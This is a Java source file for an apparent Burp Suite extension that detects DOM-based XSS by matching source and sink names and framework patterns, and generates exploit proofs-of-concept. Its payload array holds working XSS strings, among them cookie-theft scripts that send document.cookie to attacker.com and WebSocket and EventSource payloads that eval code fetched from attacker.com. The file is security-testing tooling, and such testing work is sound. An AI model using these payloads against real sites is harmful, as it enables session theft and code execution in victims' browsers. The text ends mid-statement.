package burp;

import java.util.*;
import java.util.regex.Pattern;
import java.util.regex.Matcher;
import java.net.URL;
import java.nio.charset.StandardCharsets;

/**
 * Enhanced DOM XSS Detector with Real Exploit POC Generation
 * Provides comprehensive DOM XSS detection with full reproduction steps
 */
public class EnhancedDOMXSSDetector {
    
    private final IExtensionHelpers helpers;
    private final IBurpExtenderCallbacks callbacks;
    private final Settings settings;
    
    // ENHANCED: Comprehensive DOM sources including modern SPA-specific sources (2025)
    private static final String[] DOM_SOURCES = {
        "location.href", "location.search", "location.hash", "location.pathname", "location.protocol",
        "document.referrer", "window.name", "document.cookie", "localStorage", "sessionStorage",
        "postMessage", "URLSearchParams", "document.URL", "document.documentURI", "document.baseURI",
        "window.location", "history.state", "navigator.userAgent", "screen.width", "screen.height",
        "innerHTML", "outerHTML", "textContent", "innerText", "document.title", "document.domain",
        // React Router v6+ sources
        "route.params", "route.query", "route.queryParams", "match.params", "router.query",
        "useParams", "useSearchParams", "useLocation", "useNavigate", "useLoaderData",
        "useActionData", "useFetcher", "useNavigation", "useMatches", "useOutlet",
        "useOutletContext", "useRouteLoaderData", "useRevalidator", "useResolvedPath",
        // Vue Router 4+ sources
        "$route.params", "$route.query", "this.$route.params", "this.$route.query",
        "useRoute", "useRouter", "useLink", "route.params", "route.query",
        // Angular Router sources
        "ActivatedRoute", "route.snapshot", "route.paramMap", "route.queryParamMap",
        "route.data", "route.fragment", "ActivatedRouteSnapshot", "RouterStateSnapshot",
        // Next.js App Router sources
        "useSearchParams", "usePathname", "useParams", "useRouter", "useSelectedLayoutSegment",
        "useSelectedLayoutSegments", "searchParams", "params", "headers", "cookies",
        // Nuxt 3 sources
        "useState", "useFetch", "useAsyncData", "useLazyFetch", "useLazyAsyncData",
        "useCookie", "useRequestHeaders", "useRequestURL", "useRequestEvent",
        // SvelteKit sources
        "load(", "page", "params", "data", "form", "error", "$app", "$app/stores",
        // Remix sources
        "useLoaderData", "useActionData", "useFetcher", "useNavigation", "useSubmit",
        "useFormAction", "useMatches", "useOutlet", "useOutletContext", "useRouteLoaderData",
        // Solid.js sources
        "useNavigate", "useParams", "useSearchParams", "useLocation", "useMatch",
        "useResolvedPath", "useHref", "useIsRouting",
        // Qwik sources
        "useLocation", "useNavigate", "useRouteLoader$", "useEndpoint$", "routeLoader$",
        "routeAction$", "server$", "route$",
        // Astro sources
        "Astro.props", "Astro.params", "Astro.request", "Astro.url", "Astro.cookies",
        // History API
        "history.pushState", "history.replaceState", "history.state", "window.history",
        // STATE MANAGEMENT SOURCES (Modern)
        "store.getState", "store.dispatch", "this.props", "this.state", "props", "state",
        "useState", "useReducer", "useContext", "getState", "dispatch", "commit",
        // Zustand, Jotai, Valtio, Pinia
        "useStore", "useAtom", "useAtomValue", "useSetAtom", "useAtomStore",
        "defineStore", "storeToRefs", "createPinia", "mapStores", "mapState",
        // TanStack Query (React Query)
        "useQuery", "useMutation", "useInfiniteQuery", "useQueries", "useQueryClient",
        // REAL-TIME DYNAMIC SOURCES
        "MutationObserver", "ResizeObserver", "IntersectionObserver", "PerformanceObserver",
        "WebSocket", "EventSource", "Server-Sent Events", "ServiceWorker", "WebWorker",
        "BroadcastChannel", "SharedArrayBuffer", "Dynamic Import", "WebAssembly",
        "requestAnimationFrame", "setInterval", "setTimeout", "Promise.resolve",
        "fetch", "XMLHttpRequest", "axios", "jQuery.ajax", "fetch API",
        // EVENT SOURCES
        "event.data", "message.data", "e.data", "event.target", "event.currentTarget"
    };
    
    // Advanced DOM sinks for real exploitation - Enhanced for modern frameworks (2025)
    private static final String[] DOM_SINKS = {
        "innerHTML", "outerHTML", "document.write", "document.writeln", "eval", "Function",
        "setTimeout", "setInterval", "execScript", "insertAdjacentHTML", "setAttribute",
        "appendChild", "insertBefore", "replaceChild", "createElement", "createTextNode",
        "document.createElement", "document.createTextNode", "document.createDocumentFragment",
        "jQuery.html", "jQuery.append", "jQuery.prepend", "jQuery.after", "jQuery.before",
        "ReactDOM.render", "Vue.set", "Angular.element", "DOMPurify.sanitize",
        // React modern sinks
        "dangerouslySetInnerHTML", "React.createElement", "createRoot", "hydrateRoot",
        "ReactDOM.createRoot", "ReactDOM.hydrateRoot", "renderToStaticMarkup",
        "renderToString", "renderToPipeableStream", "renderToReadableStream",
        // Vue 3 modern sinks
        "v-html", "Vue.createApp", "createSSRApp", "renderToString", "renderToNodeStream",
        "renderToWebStream", "defineComponent", "h(", "createVNode", "createTextVNode",
        // Angular modern sinks
        "[innerHTML]", "innerHTML", "DomSanitizer", "bypassSecurityTrustHtml",
        "bypassSecurityTrustScript", "bypassSecurityTrustUrl", "bypassSecurityTrustResourceUrl",
        "bypassSecurityTrustStyle", "ElementRef", "Renderer2", "Renderer",
        // Svelte modern sinks
        "@html", "{@html", "svelte:component", "svelte:element", "svelte:window",
        "svelte:body", "svelte:head", "svelte:options", "svelte:fragment",
        // Next.js sinks
        "set:html", "set:text", "is:inline", "is:global", "define:vars",
        // Astro sinks
        "set:html", "set:text", "is:inline", "is:global", "define:vars",
        // REAL-TIME DYNAMIC SINKS
        "MutationObserver.observe", "ResizeObserver.observe", "IntersectionObserver.observe",
        "WebSocket.send", "EventSource.onmessage", "postMessage", "BroadcastChannel.postMessage",
        "ServiceWorker.postMessage", "WebWorker.postMessage", "SharedArrayBuffer",
        "Dynamic Import", "WebAssembly.instantiate", "requestAnimationFrame",
        "Promise.then", "async/await", "Generator functions", "Proxy objects",
        "Reflect API", "Object.defineProperty", "Object.setPrototypeOf",
        // Modern browser APIs
        "TrustedHTML", "TrustedScript", "TrustedScriptURL", "TrustedTypes",
        "sanitize", "sanitizeFor", "createPolicy", "defaultPolicy",
        // Template literal sinks
        "String.raw", "template literals", "tagged templates", "`${",
        // Modern state management sinks
        "store.setState", "store.update", "dispatch", "commit", "mutate",
        "setState", "updateState", "set", "update", "write", "setValue"
    };
    
    // ENHANCED: Comprehensive framework-specific patterns for modern SPA detection
    private static final Map<String, String[]> FRAMEWORK_PATTERNS = new HashMap<>();
    static {
        // React 18+ with Server Components, Suspense, and modern hooks
        FRAMEWORK_PATTERNS.put("React", new String[]{
            "ReactDOM.render", "dangerouslySetInnerHTML", "React.createElement", "JSX",
            "useState", "useEffect", "useContext", "useReducer", "useCallback", "useMemo",
            "React.createElement", "React.Component", "createElement", "render(", "ReactDOM",
            "react-router", "react-router-dom", "BrowserRouter", "Route", "Link", "NavLink",
            "useParams", "useSearchParams", "useLocation", "useNavigate", "match.params",
            // React 18+ features
            "useTransition", "useDeferredValue", "useId", "useSyncExternalStore", "useInsertionEffect",
            "useActionState", "useFormState", "useOptimistic", "useFormStatus", "use",
            "Suspense", "lazy", "React.Suspense", "React.lazy", "startTransition",
            "Server Components", "use server", "use client", "async function Component",
            "createRoot", "hydrateRoot", "ReactDOM.createRoot", "ReactDOM.hydrateRoot",
            "useFormState", "useActionState", "useOptimistic", "useFormStatus",
            // React Router v6+
            "useLoaderData", "useActionData", "useFetcher", "useNavigation", "useRevalidator",
            "useRouteLoaderData", "useMatches", "useOutlet", "useOutletContext", "useResolvedPath"
        });
        // Vue 3 Composition API with <script setup> and modern patterns
        FRAMEWORK_PATTERNS.put("Vue", new String[]{
            "Vue.set", "v-html", "v-text", "v-bind", "v-on", "Vue.component", "Vue.directive",
            "$refs", "$emit", "$nextTick", "computed", "watch", "methods", "Vue.createApp",
            "vue-router", "router-link", "router-view", "$route", "$router", "useRoute", "useRouter",
            "this.$route.params", "this.$route.query", "route.params", "route.query",
            // Vue 3 Composition API
            "setup()", "<script setup>", "defineProps", "defineEmits", "defineExpose", "defineOptions",
            "defineModel", "defineSlots", "withDefaults", "useSlots", "useAttrs",
            "ref", "reactive", "readonly", "computed", "watch", "watchEffect", "watchPostEffect",
            "watchSyncEffect", "onMounted", "onUnmounted", "onBeforeMount", "onBeforeUnmount",
            "onUpdated", "onBeforeUpdate", "onActivated", "onDeactivated", "onErrorCaptured",
            "onRenderTracked", "onRenderTriggered", "provide", "inject", "getCurrentInstance",
            // Vue Router 4+
            "useRouter", "useRoute", "useLink", "onBeforeRouteLeave", "onBeforeRouteUpdate",
            // Pinia (Vue 3 state management)
            "defineStore", "storeToRefs", "useStore", "createPinia", "mapStores", "mapState",
            "mapGetters", "mapActions", "mapWritableState"
        });
        // Angular with modern patterns
        FRAMEWORK_PATTERNS.put("Angular", new String[]{
            "Angular.element", "ng-bind-html", "ng-bind", "interpolation", "{{}}", "[]",
            "Angular.module", "Angular.controller", "Angular.directive", "Angular.service",
            "@angular/router", "RouterModule", "ActivatedRoute", "routerLink", "router-outlet",
            "route.params", "route.snapshot.params", "route.queryParams", "ActivatedRoute",
            // Angular modern patterns
            "@Component", "@Injectable", "@Directive", "@Pipe", "@NgModule", "@Input", "@Output",
            "inject(", "injector", "injector.get", "injector.resolveAndCreate",
            "ActivatedRouteSnapshot", "RouterStateSnapshot", "ParamMap", "QueryParamMap",
            "route.paramMap", "route.queryParamMap", "route.data", "route.fragment"
        });
        FRAMEWORK_PATTERNS.put("jQuery", new String[]{
            "jQuery.html", "jQuery.append", "jQuery.prepend", "jQuery.after", "jQuery.before",
            "jQuery.replaceWith", "jQuery.wrap", "jQuery.unwrap", "jQuery.empty", "jQuery.remove",
            "$.html", "$.append", "$.prepend", "$.after", "$.before", "$.replaceWith"
        });
        // Svelte 5 with runes ($state, $derived, $effect)
        FRAMEWORK_PATTERNS.put("Svelte", new String[]{
            "svelte", "SvelteComponent", "@html", "bind:", "on:", "svelte/store",
            "writable", "readable", "derived", "get", "set", "update",
            // Svelte 5 runes
            "$state", "$derived", "$effect", "$props", "$derived.by", "$derived.run",
            "$state.snapshot", "$state.raw", "$state.frozen", "$state.raw.frozen",
            "runes", "svelte 5", "svelte5", "svelte/runes",
            // SvelteKit
            "sveltekit", "$app", "$app/stores", "$app/paths", "$app/environment",
            "load(", "page", "params", "data", "form", "error", "redirect", "fail"
        });
        // Next.js 13+ App Router
        FRAMEWORK_PATTERNS.put("Next.js", new String[]{
            "__NEXT_DATA__", "next/router", "useRouter", "router.query", "router.asPath",
            "getServerSideProps", "getStaticProps", "getInitialProps",
            // Next.js 13+ App Router
            "useSearchParams", "usePathname", "useParams", "useRouter", "useSelectedLayoutSegment",
            "useSelectedLayoutSegments", "useServerInsertedHTML", "use client", "use server",
            "app/", "app/layout", "app/page", "app/route", "app/loading", "app/error",
            "app/not-found", "app/global-error", "app/template", "app/default",
            "generateStaticParams", "generateMetadata", "generateViewport", "dynamicParams",
            "revalidate", "fetch", "cookies", "headers", "redirect", "notFound",
            "Route Handlers", "route.ts", "route.js", "route.tsx", "route.jsx",
            "next/navigation", "next/link", "next/image", "next/font", "next/script"
        });
        // Nuxt 3
        FRAMEWORK_PATTERNS.put("Nuxt", new String[]{
            "__NUXT__", "nuxt", "$nuxt", "$router", "$route", "nuxt-link", "nuxt-child",
            // Nuxt 3
            "useNuxtApp", "useRuntimeConfig", "useState", "useFetch", "useAsyncData",
            "useLazyFetch", "useLazyAsyncData", "useCookie", "useRequestHeaders",
            "useRequestURL", "useRequestEvent", "navigateTo", "useRouter", "useRoute",
            "definePageMeta", "defineNuxtComponent", "defineNuxtPlugin", "defineNuxtRouteMiddleware",
            "useHead", "useSeoMeta", "useServerSeoMeta", "composables", "utils",
            "pages/", "components/", "layouts/", "middleware/", "plugins/", "composables/",
            "server/api/", "server/middleware/", "server/routes/", "server/utils/"
        });
        // Solid.js
        FRAMEWORK_PATTERNS.put("Solid", new String[]{
            "solid-js", "solid", "createSignal", "createEffect", "createMemo", "createResource",
            "createStore", "createContext", "useContext", "For", "Show", "Switch", "Match",
            "Index", "Dynamic", "Portal", "ErrorBoundary", "Suspense", "SuspenseList",
            "lazy", "createComponent", "mergeProps", "splitProps", "onMount", "onCleanup",
            "onError", "untrack", "batch", "createRoot", "createRenderEffect", "createComputed",
            "solid-router", "useNavigate", "useParams", "useSearchParams", "useLocation",
            "useMatch", "useResolvedPath", "useHref", "useIsRouting", "A", "Link", "NavLink"
        });
        // Qwik
        FRAMEWORK_PATTERNS.put("Qwik", new String[]{
            "@builder.io/qwik", "qwik", "useSignal", "useTask", "useVisibleTask", "useStore",
            "useContext", "useResource", "useComputed$", "useStyles$", "useStylesScoped$",
            "useClientEffect$", "useServerMount$", "useDocumentReady$", "useVisible$",
            "component$", "slot", "Fragment", "useLexicalScope", "useRef", "useId",
            "qwik-city", "useLocation", "useNavigate", "useRouteLoader$", "useEndpoint$",
            "routeLoader$", "routeAction$", "server$", "route$", "Link", "useDocumentHead"
        });
        // Remix
        FRAMEWORK_PATTERNS.put("Remix", new String[]{
            "@remix-run", "remix", "useLoaderData", "useActionData", "useFetcher", "useNavigation",
            "useSubmit", "useFormAction", "useMatches", "useOutlet", "useOutletContext",
            "useParams", "useSearchParams", "useLocation", "useNavigate", "useRevalidator",
            "useRouteLoaderData", "useRouteError", "useHref", "useResolvedPath", "useMatch",
            "Form", "Link", "NavLink", "Outlet", "Scripts", "Meta", "Links", "json",
            "redirect", "defer", "createCookie", "createCookieSessionStorage", "createSessionStorage"
        });
        // Astro
        FRAMEWORK_PATTERNS.put("Astro", new String[]{
            "astro", "@astrojs", "Astro.props", "Astro.params", "Astro.request", "Astro.url",
            "Astro.cookies", "Astro.redirect", "Astro.canonicalURL", "Astro.site",
            "getStaticPaths", "getServerSideProps", "defineConfig", "defineCollection",
            "getCollection", "getEntry", "getEntries", "render", "Fragment", "Script",
            "set:html", "set:text", "is:inline", "is:global", "client:load", "client:idle",
            "client:visible", "client:media", "client:only", "define:vars", "define:vars"
        });
        // SvelteKit
        FRAMEWORK_PATTERNS.put("SvelteKit", new String[]{
            "@sveltejs/kit", "sveltekit", "$app", "$app/stores", "$app/paths", "$app/environment",
            "load(", "page", "params", "data", "form", "error", "redirect", "fail",
            "invalidate", "invalidateAll", "depends", "parent", "setHeaders", "setCookie",
            "deleteCookie", "getRequestEvent", "isDataRequest", "isPrerendered",
            "+page", "+page.server", "+page.client", "+layout", "+layout.server", "+layout.client",
            "+error", "+error.svelte", "+server", "+server.js", "+server.ts", "hooks.server",
            "hooks.client", "hooks.shared", "endpoints", "routes", "matchers"
        });
    }
    
    // Real DOM XSS payloads for exploitation
    private static final String[] DOM_XSS_PAYLOADS = {
        // URL Fragment XSS
        "#<script>alert('DOM_XSS')</script>",
        "#javascript:alert('DOM_XSS')",
        "#<img src=x onerror=alert('DOM_XSS')>",
        "#<svg onload=alert('DOM_XSS')>",
        
        // Hash-based XSS
        "#<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
        "#<script>new Image().src='https://attacker.com/steal?cookie='+document.cookie;</script>",
        
        // PostMessage XSS
        "<script>window.postMessage('<script>alert(1)</script>', '*')</script>",
        "<script>window.postMessage('javascript:alert(1)', '*')</script>",
        
        // Location-based XSS
        "<script>location.hash='<script>alert(1)</script>'</script>",
        "<script>location.search='?param=<script>alert(1)</script>'</script>",
        
        // DOM Sink Testing
        "<script>document.getElementById('test').innerHTML='<script>alert(1)</script>'</script>",
        "<script>document.write('<script>alert(1)</script>')</script>",
        "<script>eval(location.hash.substring(1))</script>",
        "<script>setTimeout(location.hash.substring(1), 100)</script>",
        
        // Framework-specific XSS
        "{{constructor.constructor('alert(1)')()}}", // Angular
        "${alert(1)}", // Vue
        "{{7*7}}{{alert(1)}}", // Handlebars
        "<%=alert(1)%>", // EJS
        "#{alert(1)}", // Ruby ERB
        "${7*7}${alert(1)}", // Thymeleaf",
        
        // REAL-TIME DYNAMIC DOM XSS PAYLOADS
        // MutationObserver XSS
        "<script>new MutationObserver(()=>alert('REALTIME_DOM')).observe(document,{childList:true,subtree:true})</script>",
        "<script>new MutationObserver(mutations=>eval('alert(\"REALTIME_DOM\")')).observe(document.body,{attributes:true})</script>",
        "<script>const observer=new MutationObserver(()=>Function('alert(\"REALTIME_DOM\")')());observer.observe(document,{characterData:true,subtree:true})</script>",
        
        // WebSocket Real-time XSS
        "<script>const ws=new WebSocket('ws://attacker.com');ws.onmessage=e=>eval(e.data);ws.send('alert(\"REALTIME_WS\")')</script>",
        "<script>const ws=new WebSocket('wss://attacker.com');ws.onopen=()=>ws.send('<script>alert(\"REALTIME_WS\")</script>')</script>",
        
        // EventSource/Server-Sent Events XSS
        "<script>const evtSource=new EventSource('https://attacker.com/events');evtSource.onmessage=e=>eval(e.data)</script>",
        "<script>const evtSource=new EventSource('https://attacker.com/events');evtSource.onmessage=e=>document.body.innerHTML=e.data</script>",
        
        // ServiceWorker Real-time XSS
        "<script>navigator.serviceWorker.register('data:application/javascript,self.onmessage=e=>eval(e.data)').then(sw=>sw.active.postMessage('alert(\"REALTIME_SW\")'))</script>",
        "<script>navigator.serviceWorker.register('data:application/javascript,self.onmessage=e=>document.body.innerHTML=e.data)').then(sw=>sw.active.postMessage('<script>alert(\"REALTIME_SW\")</script>'))</script>",
        
        // WebWorker Real-time XSS
        "<script>const worker=new Worker('data:application/javascript,self.onmessage=e=>eval(e.data)');worker.postMessage('alert(\"REALTIME_WW\")')</script>",
        "<script>const worker=new Worker('data:application/javascript,self.onmessage=e=>document.body.innerHTML=e.data)');worker.postMessage('<script>alert(\"REALTIME_WW\")</script>')</script>",
        
        // BroadcastChannel Real-time XSS
        "<script>const bc=new BroadcastChannel('xss');bc.onmessage=e=>eval(e.data);bc.postMessage('alert(\"REALTIME_BC\")')</script>",
        "<script>const bc=new BroadcastChannel('xss');bc.onmessage=e=>document.body.innerHTML=e.data;bc.postMessage('<script>alert(\"REALTIME_BC\")</script>')</script>",
        
        // Dynamic Import Real-time XSS
        "<script>import('data:text/javascript,alert(\"REALTIME_DI\")')</script>",
        "<script>import('data:application/javascript;base64,YWxlcnQoIlJFQUxUSU1FX0RJIik=')</script>",
        "<script>import(`data:text/javascript,alert('REALTIME_DI')`)</script>",
        
        // SharedArrayBuffer Real-time XSS
        "<script>try{const sab=new SharedArrayBuffer(16);const view=new Int32Array(sab);view[0]=0x616c6572;view[1]=0x7428293b;eval(String.fromCharCode.apply(null,view));}catch(e){alert('REALTIME_SAB')}</script>",
        
        // WebAssembly Real-time XSS
        "<script>WebAssembly.instantiate(new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00])).then(()=>alert('REALTIME_WASM'))</script>",
        
        // requestAnimationFrame Real-time XSS
        "<script>requestAnimationFrame(()=>alert('REALTIME_RAF'))</script>",
        "<script>requestAnimationFrame(()=>eval('alert(\"REALTIME_RAF\")'))</script>",
        
        // Promise-based Real-time XSS
        "<script>Promise.resolve().then(()=>alert('REALTIME_PROMISE'))</script>",
        "<script>Promise.resolve().then(()=>eval('alert(\"REALTIME_PROMISE\")'))</script>",
        
        // Async/Await Real-time XSS
        "<script>(async()=>{await Promise.resolve();alert('REALTIME_ASYNC')})()</script>",
        "<script>(async()=>{await Promise.resolve();eval('alert(\"REALTIME_ASYNC\")')})()</script>",
        
        // Proxy-based Real-time XSS
        "<script>const handler={get:()=>alert('REALTIME_PROXY')};const proxy=new Proxy({},handler);proxy.anyProperty</script>",
        
        // Reflect API Real-time XSS
        "<script>Reflect.get({},'constructor').constructor('alert(\"REALTIME_REFLECT\")')()</script>",
        
        // Object.defineProperty Real-time XSS
        "<script>Object.defineProperty(window,'xss',{get:()=>alert('REALTIME_DEFINE')});window.xss</script>",
        
        // Generator Function Real-time XSS
        "<script>function*gen(){yield alert('REALTIME_GEN');}gen().next()</script>",
        
        // ResizeObserver Real-time XSS
        "<script>new ResizeObserver(()=>alert('REALTIME_RESIZE')).observe(document.body)</script>",
        
        // IntersectionObserver Real-time XSS
        "<script>new IntersectionObserver(()=>alert('REALTIME_INTERSECT')).observe(document.body)</script>",
        
        // PerformanceObserver Real-time XSS
        "<script>new PerformanceObserver(()=>alert('REALTIME_PERF')).observe({entryTypes:['navigation']})</script>"
    };
    
    public EnhancedDOMXSSDetector(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, Settings settings) {
        this.helpers = helpers;
        this.callbacks = callbacks;
        this.settings = settings;
    }
    
    /**
     * Comprehensive DOM XSS Analysis with Real Exploit Generation
     */
    public DOMXSSResult analyzeDOMXSS(IHttpRequestResponse requestResponse) {
        DOMXSSResult result = new DOMXSSResult();

        try {
            // Extract response body
            byte[] response = requestResponse.getResponse();

            // Skip non-HTML responses — DOM XSS only applies to rendered HTML
            try {
                IResponseInfo respInfo = helpers.analyzeResponse(response);
                for (String header : respInfo.getHeaders()) {
                    if (header.toLowerCase().startsWith("content-type:")) {
                        String ct = header.substring(header.indexOf(":") + 1).trim().toLowerCase();
                        if (ct.contains("application/json") || ct.contains("application/graphql") ||
                            ct.contains("image/") || ct.contains("font/") ||
                            ct.contains("application/octet-stream") || ct.contains("application/pdf")) {
                            return result; // Not HTML — no DOM XSS possible
                        }
                        break;
                    }
                }
            } catch (Exception ignored) {}

            int bodyOffset = helpers.analyzeResponse(response).getBodyOffset();
            String responseBody = new String(Arrays.copyOfRange(response, bodyOffset, response.length), StandardCharsets.UTF_8);
            
            // Perform comprehensive analysis
            result = performComprehensiveAnalysis(responseBody, requestResponse);
            
            // Generate real exploit POC if vulnerability detected
            if (result.isVulnerable()) {
                result.setExploitPOC(generateRealExploitPOC(result, requestResponse));
                result.setReproductionSteps(generateReproductionSteps(result, requestResponse));
                result.setSourceSinkAnalysis(generateSourceSinkAnalysis(result));
                result.setBrowserExploitCode(generateBrowserExploitCode(result, requestResponse));
                
                // CRITICAL FIX: Create real exploited evidence for professional advisory
                createRealExploitedEvidence(result, requestResponse);
            }
            
        } catch (Exception e) {
            callbacks.printError("DOM XSS Analysis Error: " + e.getMessage());
        }
        
        return result;
    }
    
    /**
     * Comprehensive DOM XSS Analysis
     */
    private DOMXSSResult performComprehensiveAnalysis(String html, IHttpRequestResponse requestResponse) {
        DOMXSSResult result = new DOMXSSResult();
        
        // Detect DOM sources
        List<DOMSource> detectedSources = detectDOMSources(html);
        result.setDetectedSources(detectedSources);
        
        // Detect DOM sinks
        List<DOMSink> detectedSinks = detectDOMSinks(html);
        result.setDetectedSinks(detectedSinks);
        
        // Detect frameworks
        List<String> detectedFrameworks = detectFrameworks(html);
        result.setDetectedFrameworks(detectedFrameworks);
        
        // REAL-TIME DYNAMIC ANALYSIS
        RealTimeDynamicAnalysis realTimeAnalysis = performRealTimeDynamicAnalysis(html, requestResponse);
        result.setRealTimeAnalysis(realTimeAnalysis);
        
        // Analyze data flow
        List<DataFlow> dataFlows = analyzeDataFlow(detectedSources, detectedSinks, html);
        result.setDataFlows(dataFlows);
        
        // Calculate vulnerability score with real-time bonus
        int vulnerabilityScore = calculateVulnerabilityScore(detectedSources, detectedSinks, dataFlows, realTimeAnalysis);
        result.setVulnerabilityScore(vulnerabilityScore);
        
        // CRITICAL FIX: Determine if vulnerable - Require STRONG evidence
        // Must have actual data flows (source-sink correlation) OR high-confidence real-time vectors
        // Just having sources/sinks without correlation is NOT enough (prevents false positives)
        boolean hasActualDataFlows = !dataFlows.isEmpty();
        boolean hasHighConfidenceRealTime = realTimeAnalysis.hasRealTimeVectors() && 
            (realTimeAnalysis.isHasWebSocket() || realTimeAnalysis.isHasMutationObserver() || 
             realTimeAnalysis.isHasServiceWorker() || realTimeAnalysis.isHasDynamicImport() ||
             realTimeAnalysis.isHasWebAssembly());
        boolean hasHighRiskSourcesAndSinks = !detectedSources.isEmpty() && !detectedSinks.isEmpty() && 
            vulnerabilityScore >= 70; // High score indicates strong correlation
        
        // CRITICAL: Only mark as vulnerable if we have STRONG evidence AND actual exploitable data flows
        // Require actual data flows with user-controlled sources flowing into dangerous sinks
        boolean hasExploitableDataFlows = false;
        if (!dataFlows.isEmpty()) {
            for (DataFlow flow : dataFlows) {
                if (flow != null && flow.getSource() != null && flow.getSink() != null) {
                    String sourceName = flow.getSource().getName().toLowerCase();
                    String sinkName = flow.getSink().getName().toLowerCase();
                    
                    // Check if source is user-controlled
                    boolean isUserControlled = sourceName.contains("location.hash") ||
                                            sourceName.contains("location.search") ||
                                            sourceName.contains("location.href") ||
                                            sourceName.contains("document.referrer") ||
                                            sourceName.contains("window.name") ||
                                            sourceName.contains("urlsearchparams");
                    
                    // Check if sink is dangerous
                    boolean isDangerousSink = sinkName.contains("eval") || 
                                            sinkName.contains("innerhtml") || 
                                            sinkName.contains("outerhtml") ||
                                            sinkName.contains("document.write") ||
                                            (sinkName.contains("function") && 
                                             flow.getSink().getContext() != null && 
                                             flow.getSink().getContext().toLowerCase().contains("eval"));
                    
                    if (isUserControlled && isDangerousSink) {
                        hasExploitableDataFlows = true;
                        break;
                    }
                }
            }
        }
        
        // Only mark as vulnerable if we have STRONG evidence AND exploitable data flows
        boolean isVulnerable = vulnerabilityScore >= 60 && 
            (hasExploitableDataFlows || hasHighConfidenceRealTime);
        result.setVulnerable(isVulnerable);
        
        // Set confidence and risk level
        result.setConfidenceLevel(calculateConfidenceLevel(vulnerabilityScore));
        result.setRiskLevel(calculateRiskLevel(vulnerabilityScore));
        
        // Generate specific payloads - Enhanced with real-time payloads
        if (!detectedSources.isEmpty() || !detectedSinks.isEmpty() || realTimeAnalysis.hasRealTimeVectors()) {
            List<String> allPayloads = new ArrayList<>();
            allPayloads.addAll(generateSpecificPayloads(detectedSources, detectedSinks, detectedFrameworks));
            allPayloads.addAll(generateRealTimeDynamicPayloads(realTimeAnalysis));
            result.setSpecificPayloads(allPayloads);
        }
        
        return result;
    }
    
    /**
     * REAL-TIME DYNAMIC DOM ANALYSIS - ENHANCED WITH ADVANCED PATTERN MATCHING
     * Detects live DOM changes, dynamic content updates, and real-time exploitation vectors
     * Uses context-aware regex patterns for accurate detection
     */
    private RealTimeDynamicAnalysis performRealTimeDynamicAnalysis(String html, IHttpRequestResponse requestResponse) {
        RealTimeDynamicAnalysis analysis = new RealTimeDynamicAnalysis();
        String htmlLower = html.toLowerCase();
        
        // MUTATION OBSERVER DETECTION - Enhanced with regex patterns
        Pattern mutationObserverPattern = Pattern.compile(
            "(?:new\\s+)?MutationObserver\\s*\\(|MutationObserver\\.observe|mutationobserver|mutation\\s+observer",
            Pattern.CASE_INSENSITIVE | Pattern.MULTILINE
        );
        if (mutationObserverPattern.matcher(html).find()) {
            // Check for actual usage (not just mention)
            Pattern usagePattern = Pattern.compile(
                "MutationObserver\\s*\\([^)]*\\)|MutationObserver\\.observe\\s*\\(|new\\s+MutationObserver",
                Pattern.CASE_INSENSITIVE
            );
            if (usagePattern.matcher(html).find()) {
                analysis.setHasMutationObserver(true);
                analysis.setMutationObserverRisk("HIGH");
                analysis.getRealTimeVectors().add("MutationObserver");
                callbacks.printOutput("[REALTIME] MutationObserver detected with actual usage - Real-time DOM monitoring active");
            }
        }
        
        // WEBSOCKET DETECTION - Enhanced with regex patterns
        Pattern webSocketPattern = Pattern.compile(
            "(?:new\\s+)?WebSocket\\s*\\(|websocket|ws://|wss://|socket\\.io",
            Pattern.CASE_INSENSITIVE
        );
        if (webSocketPattern.matcher(html).find()) {
            // Check for actual WebSocket instantiation
            Pattern wsUsagePattern = Pattern.compile(
                "new\\s+WebSocket\\s*\\(|WebSocket\\s*\\(|socket\\.io\\(|io\\.connect",
                Pattern.CASE_INSENSITIVE
            );
            if (wsUsagePattern.matcher(html).find()) {
                analysis.setHasWebSocket(true);
                analysis.setWebSocketRisk("HIGH");
                analysis.getRealTimeVectors().add("WebSocket");
                callbacks.printOutput("[REALTIME] WebSocket detected with actual usage - Real-time communication active");
            }
        }
        
        // EVENT SOURCE DETECTION
        if (htmlLower.contains("eventsource") || htmlLower.contains("server-sent") || htmlLower.contains("sse")) {
            analysis.setHasEventSource(true);
            analysis.setEventSourceRisk("MEDIUM");
            analysis.getRealTimeVectors().add("EventSource");
            callbacks.printOutput("[REALTIME] EventSource detected - Server-sent events possible");
        }
        
        // SERVICE WORKER DETECTION - Enhanced with regex patterns
        Pattern serviceWorkerPattern = Pattern.compile(
            "navigator\\.serviceWorker|serviceWorker\\.register|service\\s*worker|serviceworker",
            Pattern.CASE_INSENSITIVE
        );
        if (serviceWorkerPattern.matcher(html).find()) {
            // Check for actual registration
            Pattern swRegisterPattern = Pattern.compile(
                "serviceWorker\\.register\\s*\\(|navigator\\.serviceWorker\\.register",
                Pattern.CASE_INSENSITIVE
            );
            if (swRegisterPattern.matcher(html).find()) {
                analysis.setHasServiceWorker(true);
                analysis.setServiceWorkerRisk("HIGH");
                analysis.getRealTimeVectors().add("ServiceWorker");
                callbacks.printOutput("[REALTIME] ServiceWorker detected with registration - Background processing active");
            }
        }
        
        // WEB WORKER DETECTION - Enhanced with regex patterns
        Pattern webWorkerPattern = Pattern.compile(
            "(?:new\\s+)?(?:Worker|SharedWorker|WebWorker)\\s*\\(|web\\s*worker|webworker",
            Pattern.CASE_INSENSITIVE
        );
        if (webWorkerPattern.matcher(html).find()) {
            // Check for actual worker instantiation
            Pattern workerUsagePattern = Pattern.compile(
                "new\\s+(?:Worker|SharedWorker)\\s*\\(|Worker\\s*\\(|SharedWorker\\s*\\(",
                Pattern.CASE_INSENSITIVE
            );
            if (workerUsagePattern.matcher(html).find()) {
                analysis.setHasWebWorker(true);
                analysis.setWebWorkerRisk("MEDIUM");
                analysis.getRealTimeVectors().add("WebWorker");
                callbacks.printOutput("[REALTIME] WebWorker detected with instantiation - Background threading active");
            }
        }
        
        // BROADCAST CHANNEL DETECTION - Enhanced with regex patterns
        Pattern broadcastChannelPattern = Pattern.compile(
            "(?:new\\s+)?BroadcastChannel\\s*\\(|broadcastchannel|broadcast\\s*channel",
            Pattern.CASE_INSENSITIVE
        );
        if (broadcastChannelPattern.matcher(html).find()) {
            // Check for actual usage
            Pattern bcUsagePattern = Pattern.compile(
